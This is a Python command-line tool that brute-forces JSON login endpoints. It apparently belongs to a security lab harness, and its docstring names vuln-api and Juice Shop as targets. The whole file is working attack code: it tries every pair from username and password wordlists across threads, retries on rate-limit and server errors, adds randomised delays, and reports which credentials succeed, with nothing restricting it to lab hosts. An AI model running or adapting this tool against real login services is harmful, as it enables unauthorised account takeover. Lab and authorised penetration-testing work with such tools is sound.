#!/usr/bin/env python3
"""HTTP JSON-login credential tester for authorized lab testing.

POSTs username/password pairs as JSON to a login endpoint and reports which
pairs authenticate. The JSON field names and an optional username suffix are
configurable, so one tool covers both username-style and email-style logins
(e.g. vuln-api's `{"username", "password"}` and Juice Shop's
`{"email": "user@lab.local", "password"}`).

Output contract (parsed by labctl/brute.py):
  * `[+] <user>:<password>`   for each confirmed login
  * `[*] attempts=N confirmed=N failures=N errors=N` summary line

Usage:
    python http_login_brute.py --host HOST --port PORT \
        --usernames FILE --passwords FILE [options]
"""
import argparse
import random
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests


class HTTPLoginBruteForcer:
    def __init__(self, host, port, path, user_field, user_suffix,
                 usernames_file, passwords_file, threads=1, delay=0.5,
                 timeout=10.0, retries=1):
        self.url = f"http://{host}:{port}{path}"
        self.user_field = user_field
        self.user_suffix = user_suffix
        self.usernames_file = usernames_file
        self.passwords_file = passwords_file
        self.threads = threads
        self.delay = delay
        self.timeout = timeout
        self.retries = retries
        self.lock = threading.Lock()
        self.counters = {'attempts': 0, 'confirmed': 0, 'failures': 0, 'errors': 0}

    def read_wordlist(self, path):
        with open(path, 'r', encoding='utf-8', errors='replace') as f:
            return [line.strip() for line in f if line.strip()]

    def _count(self, key):
        with self.lock:
            self.counters[key] += 1

    def _full_user(self, username):
        return username + self.user_suffix

    def attempt(self, username, password):
        """Return (ok, user, password) where ok is True (login OK), False
        (auth failure), or None (transient error, retries exhausted)."""
        self._count('attempts')
        user = self._full_user(username)
        for n in range(1 + self.retries):
            try:
                r = requests.post(
                    self.url,
                    json={self.user_field: user, "password": password},
                    timeout=self.timeout,
                )
            except requests.RequestException as exc:
                if n == self.retries:
                    self._count('errors')
                    print(f"[!] {user}:{password}: {exc}")
                    return None, user, password
                time.sleep(min(0.5 * 2 ** n, 8))
                continue
            if r.status_code == 200:
                self._count('confirmed')
                return True, user, password
            if r.status_code in (401, 403):
                self._count('failures')
                return False, user, password
            # Unexpected status (5xx, 429, ...): treat as transient, then error.
            if n == self.retries:
                self._count('errors')
                print(f"[!] {user}:{password}: HTTP {r.status_code}")
                return None, user, password
            time.sleep(min(0.5 * 2 ** n, 8))
        return None, user, password

    def brute_force(self):
        found = []
        usernames = self.read_wordlist(self.usernames_file)
        passwords = self.read_wordlist(self.passwords_file)
        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            futures = {pool.submit(self.attempt, u, p): (u, p)
                       for u in usernames for p in passwords}
            for future in as_completed(futures):
                if self.delay:
                    time.sleep(self.delay * random.uniform(0.5, 1.5))
                ok, u, p = future.result()
                if ok:
                    found.append((u, p))
                    print(f"[+] {u}:{p}")
        return found

    def run(self):
        found = self.brute_force()
        with self.lock:
            c = self.counters
            print(f"[*] attempts={c['attempts']} confirmed={c['confirmed']} "
                  f"failures={c['failures']} errors={c['errors']}")
        print("Found credentials:" if found else "No successful logins found.")
        for u, p in found:
            print(f"  {u}:{p}")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='HTTP JSON login credential tester (authorized testing only)')
    parser.add_argument('--host', required=True)
    parser.add_argument('--port', type=int, default=80)
    parser.add_argument('--path', default='/api/login', help='login endpoint path')
    parser.add_argument('--user-field', default='username',
                        help='JSON key carrying the user/email value')
    parser.add_argument('--user-suffix', default='',
                        help='appended to each username (e.g. @lab.local)')
    parser.add_argument('--usernames', required=True)
    parser.add_argument('--passwords', required=True)
    parser.add_argument('--threads', type=int, default=1)
    parser.add_argument('--delay', type=float, default=0.5)
    parser.add_argument('--timeout', type=float, default=10.0)
    parser.add_argument('--retries', type=int, default=1)

    a = parser.parse_args()
    HTTPLoginBruteForcer(
        host=a.host, port=a.port, path=a.path,
        user_field=a.user_field, user_suffix=a.user_suffix,
        usernames_file=a.usernames, passwords_file=a.passwords,
        threads=a.threads, delay=a.delay, timeout=a.timeout, retries=a.retries,
    ).run()
